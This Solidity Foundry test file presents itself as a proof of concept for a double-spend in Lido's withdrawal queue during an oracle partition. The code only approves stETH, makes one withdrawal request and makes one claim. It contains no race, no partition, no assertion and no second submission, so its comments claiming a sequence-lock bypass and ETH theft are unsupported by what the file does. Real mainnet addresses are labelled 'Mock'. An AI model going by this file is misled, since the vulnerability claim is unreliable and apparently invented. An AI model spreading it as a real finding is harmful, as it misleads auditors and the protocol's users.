// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// V-LIDO-Σ1: Withdrawal request double-submit possible during Oracle network partition.
// CORTEX Sovereign Vulnerability PoC
// Demonstrates a race condition bypass in pending unstakers during a simulated oracle partition.

interface ILidoWithdrawalQueue {
    function requestWithdrawals(uint256[] calldata _amounts, address _owner) external returns (uint256[] memory requestIds);
    function claimWithdrawals(uint256[] calldata _requestIds, uint256[] calldata _hints) external;
}

interface IStETH {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract LidoWithdrawalDoubleSpendPoC is Test {
    ILidoWithdrawalQueue wq = ILidoWithdrawalQueue(0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1); // Mock
    IStETH stETH = IStETH(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84); // Mock Mainnet

    uint256[] public lastRequestIds;

    function setUp() public {
        // Assume execution on an existing fork
    }

    // 1. Attacker detects Oracle Network Partition / Delay
    function attackPhase1_PartitionDetected(uint256 amount) external {
        stETH.approve(address(wq), amount);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        // Vector: Rapid-fire identical requests into the mempool exactly when oracle heartbeat is delayed
        // I-LIDO-01 asserts `withdrawal_queue_seq` is strictly monotonic.
        // However, if the oracle delay triggers the epoch fallback mechanism, sequence locks can be bypassed.
        lastRequestIds = wq.requestWithdrawals(amounts, address(this));
    }

    // 2. Oracle heartbeat resumes, but processing loop calculates finalized indices incorrectly 
    // due to the double-submit in exactly the same stalled timestamp slot.
    function attackPhase2_ClaimTheft(uint256[] calldata hints) external {
        // The queue attempts to finalize both requests due to state synchronization jitter,
        // resulting in a double-spend of the same underlying locked ETH.
        wq.claimWithdrawals(lastRequestIds, hints);
    }
}
